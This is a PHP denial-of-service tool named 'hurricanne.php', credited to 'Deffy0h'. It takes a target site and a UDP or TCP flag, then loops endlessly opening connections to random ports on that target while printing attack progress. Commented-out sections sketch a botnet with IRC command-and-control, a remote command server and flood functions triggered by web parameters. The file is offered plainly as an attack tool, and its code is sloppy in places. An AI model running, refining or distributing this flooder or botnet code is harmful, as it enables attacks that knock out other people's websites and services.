<?php

set_time_limit(0);
error_reporting(0);
ignore_user_abort(true); 

/*
if(isset($_GET['ver'])){echo '<HTML><HEAD><TITLE>'.$EE[2].'</TITLE></HEAD><BODY><IMG SRC="http://i.imgur.com/nxKmlR3.jpg" WIDTH="100%" HEIGHT="100%" /></BODY></HTML>';exit;}//O Bonde

//Create By Deffy0h
//\\BotNet

/*
*UdpFlood
*TcpFlood
*/


/*IRC*/
/*
class IRC{
	public $server="chat.freenode.net";
	public $port=6665;
	public $channel="#anarchyBot";
	public $nick="Deffy0h";
}

$irc=new IRC();

$nickqq="BOT_".rand(0,500).rand(0,500).rand(0,500).rand(0,500);
$nameqq="BOT_".rand(0,500).rand(0,500).rand(0,500).rand(0,500);
$ident="";

$fp=fsockopen($irc->server,$irc->port,$eeei,$iiiie,5);if(!$fp){
echo "servidor nao esta online\n";exit;
}

fputs($fp,"USER $nickqq 2 3 :$nameqq\r\n");
fputs($fp,"NICK $nickqq $ident\r\n");
fputs($fp,"JOIN $channel \r\n");
fputs($fp,"PRIVMSG $channel : Olá Sou um bot");
*/
/*

class SERVER{
	public $host="http://quailfile.com";
	public $vhost="anarchybot0012547597.com";
	public $port=80;
	public $path="COMMAND.php";
}

$h=new SERVER();
$hv="";
$hv=$h->host."/".$h->path;
$fvp=fsockopen($hv,$h->port,$RRR,$EEE,5);if($fvp){
echo "not online\n";
}


$EE=array(
	"",
	"Deffy0h - Save: Colder | Plastyne | SM0ld3R | N0v3",
);

$hv.="?password=".$EE[0];


//SERVER LO

$c=curl_init();
curl_setopt($c,CURLOPT_URL,$hv);
$rv=curl_exec($c);
$password="";//$_GET['password'];
$CMD="";//$_GET['CMD'];


/*$password=@md5($password);
if(isset($_GET['password'])){
if($password==$EE[0]){
echo 'AnarchyGhost';
}else{
exit;
}
}else{
exit;
}*/


//if(!isset($_GET['CMD'])){
//exit;
//}else{

//}
/**/


/*switch($CMD){
	case 'UdpFlood':
		UdpFlood();
	break;
	case 'TcpFlood':
		TcpFlood();
	break;
	default:
		exit;
	break;
}*/

/*function UdpFlood(){
	
if(!isset($_GET['URL'])){
$htos='127.0.0.1';
}else{
$htos=$_GET['URL'];
}

if(isset($_GET['NUM'])){
$NUM=$_GET['NUM'];
}else{
$NUM=5000000;
}
	
$EPack='';
for($i=0;$i<6000;$i++){
$EPack.="X".chr(mt_rand(1,256));//cria um pacote com base em [A-Z] usando X+ASCII-CODE	
}
$ii=0;
while($ii<$NUM){
$fsUDP=fsockopen('udp://'.$htos,mt_rand(0,65500),$eeei,$iiiie,5);
if($fsUDP){
$ii++;
}
}
/*Converte Byts em MB*/
/*$MB=$ii*$NUM;
$MB=$MB/1048576;
$MB=round($MB);
}*/

//function Flood($hand){
	
/*if(!isset($_GET['URL'])){
$htos='127.0.0.1';
}else{
$htos=$_GET['URL'];
}

if(isset($_GET['NUM'])){
$NUM=$_GET['NUM'];
}else{
$NUM=300;
}*/

$banner="


=======================================================================
=  ====================================================================
=  ====================================================================
=  ====================================================================
=  =====  =  ==  =   ===  =   ===  ===   ====   ===  = ===  = ====   ==
=    ===  =  ==    =  ==    =  ======  =  ==  =  ==     ==     ==  =  =
=  =  ==  =  ==  =======  =======  ==  ========  ==  =  ==  =  ==     =
=  =  ==  =  ==  =======  =======  ==  ======    ==  =  ==  =  ==  ====
=  =  ==  =  ==  =======  =======  ==  =  ==  =  ==  =  ==  =  ==  =  =
=  =  ===    ==  =======  =======  ===   ====    ==  =  ==  =  ===   ==
=======================================================================

\t\t\tCreate By Deffy0h


usage:
php hurricanne.php site.com --udp - attack UDPFlood
php hurricanne.php site.com --tcp - attack TCPFlood

";

//system("cls");
//system("clear");
echo $banner;

usleep(5000000);

$url=$argv[1];
//remove protocolos WWW
$url=str_replace("http://","",$url);
$url=str_replace("https://","",$url);
if(empty($url)){echo "\ndigite a url \n";exit;}

$proto="";
switch($argv[2]){
	case "--udp":
		$proto="udp://";
	break;
	case "--tcp":
		$proto="tcp://";
	break;
	default:
		echo "\ndefina o protocolo \n";exit;
	break;
}	

$EPack='';
for($i=0;$i<600;$i++){
$EPack.="D".chr(mt_rand(1,256));//cria um pacote com base em [A-Z] usando X+ASCII-CODE	
$EPack.="E".chr(mt_rand(1,256));
$EPack.="F".chr(mt_rand(1,256));
$EPack.="F".chr(mt_rand(1,256));
$EPack.="Y".chr(mt_rand(1,256));
}
$MB=0;
while(1){

for($i=0;$i<10;$i++){
$fsTCP=fsockopen($proto.$url,mt_rand(0,6000),$eeei,$iiiie,5);
/*Converte Byts em MB*/
$MB=$MB+66;
$vMB=$MB/1024;
//;;;
$ii++;

if($MB<(1*1024*(1024))){
$rola=substr(($vMB),0,3)."KB";
}
if($MB>=(1*1024*(1024))){
$rola=substr(($vMB/1024),0,3)."MB";
}

echo "[*] (".$ii.") ATTACK: ".$rola." Send Package With 66 Byts To ".$url."\n";
}

/*if($fsTCP){

}*/
}
//}

?>
